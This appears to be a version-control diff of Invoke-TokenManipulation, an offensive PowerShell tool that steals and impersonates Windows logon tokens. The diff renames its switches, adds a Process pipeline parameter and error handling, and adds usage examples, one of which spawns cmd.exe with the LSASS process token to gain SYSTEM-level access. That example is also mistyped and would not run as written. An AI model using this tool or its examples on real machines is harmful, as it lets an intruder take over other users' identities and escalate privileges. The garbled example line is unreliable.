@@ -46,13 +46,13 @@ Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 0.20
+Version: 0.21
 
 .DESCRIPTION
 
 Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.
 
-.PARAMETER Enum
+.PARAMETER Enumerate
 
 Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).
 
@@ -62,7 +62,7 @@ Switch. Stops impersonating an alternate users Token.
 
 .PARAMETER ShowAll
 
-Switch. If Enum is specified with this flag, all Logon Tokens will be listed (including non-unique tokens and NetworkLogon tokens).
+Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).
 
 .PARAMETER ImpersonateUser
 
@@ -85,6 +85,10 @@ Specify the Token to use by username. This will choose a non-NetworkLogon token 
 
 Specify the Token to use by ProcessId. This will use the primary token of the process specified.
 
+.PARAMETER Process
+
+Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.
+
 .PARAMETER ThreadId
 
 Specify the Token to use by ThreadId. This will use the token of the thread specified.
@@ -102,7 +106,7 @@ to "Everyone".
 	
 .EXAMPLE
 
-Invoke-TokenManipulation -Enum
+Invoke-TokenManipulation -Enumerate
 
 Lists all unique usable tokens on the computer.
 
@@ -126,9 +130,21 @@ Spawns cmd.exe using the primary token belonging to process ID 500.
 
 .EXAMPLE
 
-Invoke-TokenManipulation -Enum -ShowAll
+Invoke-TokenManipulation -ShowAll
 
 Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.
+
+.EXAMPLE
+
+Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500
+
+Spawns cmd.exe using the token belonging to thread ID 500.
+
+.EXAMPLE
+
+Get-Proces lsass | Token-TokenManipulation -CreateProcess "cmd.exe"
+
+Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.
 
 .NOTES
 This script was inspired by incognito. 
@@ -143,11 +159,11 @@ Github repo: https://github.com/clymb3r/PowerShell
 
 #>
 
-    [CmdletBinding(DefaultParameterSetName="Enum")]
+    [CmdletBinding(DefaultParameterSetName="Enumerate")]
     Param(
-        [Parameter(ParameterSetName = "Enum")]
+        [Parameter(ParameterSetName = "Enumerate")]
         [Switch]
-        $Enum,
+        $Enumerate,
 
         [Parameter(ParameterSetName = "RevToSelf")]
         [Switch]
@@ -178,6 +194,11 @@ Github repo: https://github.com/clymb3r/PowerShell
         [Parameter(ParameterSetName = "CreateProcess")]
         [Int]
         $ProcessId,
+
+        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
+        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
+        [System.Diagnostics.Process]
+        $Process,
 
         [Parameter(ParameterSetName = "ImpersonateUser")]
         [Parameter(ParameterSetName = "CreateProcess")]
@@ -1608,6 +1629,11 @@ Github repo: https://github.com/clymb3r/PowerShell
     #Main function
     function Main
     {
+        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+        {
+            Write-Error "Script must be run as administrator" -ErrorAction Stop
+        }
+
         $OriginalUser = [Environment]::UserName
 
         if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
@@ -1619,21 +1645,34 @@ Github repo: https://github.com/clymb3r/PowerShell
             $AllTokens = Enum-AllTokens
             
             #Select the token to use
+            [IntPtr]$hToken = [IntPtr]::Zero
             $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
-            if ($Username -ne $null -and $Username -ne '' -and $UniqueTokens.ContainsKey($Username))
+            if ($Username -ne $null -and $Username -ne '')
             {
-                $hToken = $UniqueTokens[$Username].hToken
-                Write-Verbose "Selecting token by username"
+                if ($UniqueTokens.ContainsKey($Username))
+                {
+                    $hToken = $UniqueTokens[$Username].hToken
+                    Write-Verbose "Selecting token by username"
+                }
+                else
+                {
+                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
+                }
             }
             elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
             {
                 foreach ($Token in $AllTokens)
                 {
-                    if ($Token.ProcessId -eq $ProcessId)
+                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $ProcessId)
                     {
                         $hToken = $Token.hToken
                         Write-Verbose "Selecting token by ProcessID"
                     }
+                }
+
+                if ($hToken -eq [IntPtr]::Zero)
+                {
+                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                 }
             }
             elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
@@ -1646,6 +1685,31 @@ Github repo: https://github.com/clymb3r/PowerShell
                         Write-Verbose "Selecting token by ThreadId"
                     }
                 }
+
+                if ($hToken -eq [IntPtr]::Zero)
+                {
+                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
+                }
+            }
+            elseif ($Process -ne $null)
+            {
+                foreach ($Token in $AllTokens)
+                {
+                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
+                    {
+                        $hToken = $Token.hToken
+                        Write-Verbose "Selecting token by Process object"
+                    }
+                }
+
+                if ($hToken -eq [IntPtr]::Zero)
+                {
+                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
+                }
+            }
+            else
+            {
+                Write-Error "Must supply a Username, ProcessId, ThreadId, or Process object"  -ErrorAction Stop
             }
 
             #Use the token for the selected action
@@ -1675,7 +1739,7 @@ Github repo: https://github.com/clymb3r/PowerShell
         {
             Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
         }
-        else #Default option, which is $enum
+        else #Enumerate tokens
         {
             $AllTokens = Enum-AllTokens
 
@@ -1685,7 +1749,6 @@ Github repo: https://github.com/clymb3r/PowerShell
             }
             else
             {
-                Write-Output "Unique tokens sorted by user:"
                 Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
             }
 
